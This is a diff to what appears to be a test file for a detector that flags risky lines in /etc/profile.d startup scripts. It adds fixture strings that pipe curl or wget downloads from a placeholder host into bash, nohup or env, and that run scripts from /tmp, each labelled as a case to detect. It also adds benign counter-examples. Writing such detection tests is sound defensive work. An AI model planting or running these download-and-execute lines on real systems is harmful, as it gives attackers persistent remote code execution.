@@ -55,6 +55,20 @@ SIGNED = [
     ("shell_startup", "/etc/profile.d/d3.sh", "source <(curl -s https://example.invalid/i)\n", "download_into_shell"),
     ("shell_startup", "/etc/profile.d/d4.sh", "bash <(curl -s https://example.invalid/i)\n", "download_into_shell"),
     ("shell_startup", "/etc/profile.d/d5.sh", ". <(curl -s https://example.invalid/i)\n", "download_into_shell"),
+    # From the second review: a backtick command as a redirection's file, combined -c options, and a download
+    # run behind a launcher or an assignment.
+    ("shell_startup", "/etc/profile.d/b1.sh", "echo hi >`/tmp/agent`\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/c1.sh", 'bash -ec "$(curl -fsSL https://example.invalid/i)"\n',
+     "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/c2.sh", 'bash -lc "cd /; /tmp/x"\n', "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/c3.sh", "bash -o errexit /tmp/.x/run.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/c4.sh", "bash +O extglob /tmp/.x/run.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/c5.sh", "bash +x /tmp/.x/run.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/n1.sh", "nohup $(curl -fsSL https://example.invalid/i)\n", "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/n2.sh", "MODE=batch $(curl -fsSL https://example.invalid/i)\n",
+     "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/n3.sh", "env A=1 B=2 $(wget -qO- https://example.invalid/i)\n",
+     "download_into_shell"),
 ]
 
 QUIET = [
@@ -70,7 +84,8 @@ QUIET = [
      "python3 > /tmp/app.log /opt/app/main.py\n> /tmp/started /usr/bin/true\n"),
     ("shell_startup", "/etc/profile.d/fetched.sh",
      "VERSION=$(curl -fsSL https://example.invalid/version)\nx=$(wget -qO- https://example.invalid/v) && echo $x\n"
-     "echo $(curl -s https://example.invalid/ip) >> /var/log/ip\ndiff <(curl -s https://example.invalid/a) /etc/a\n"),
+     "echo $(curl -s https://example.invalid/ip) >> /var/log/ip\ndiff <(curl -s https://example.invalid/a) /etc/a\n"
+     "nohup /usr/bin/app $(curl -s https://example.invalid/args)\nbash --rcfile /etc/x -i\nperl -e 'print 1'\n"),
     ("init", "/etc/init.d/placeholder", '#!/bin/sh\n# curl http://example.invalid | sh\nif (-e "/tmp/.X11-unix/X$n")\n'),
 ]
 
